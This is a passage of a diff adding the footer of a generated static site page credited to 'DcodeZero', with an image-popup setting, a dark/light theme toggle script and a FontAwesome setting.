+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/DcodeZero/dcodezero.github.io">DcodeZero</a> theme for dcodezero by <a href="https://github.com/DcodeZero/dcodezero.github.io">dcodezero</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
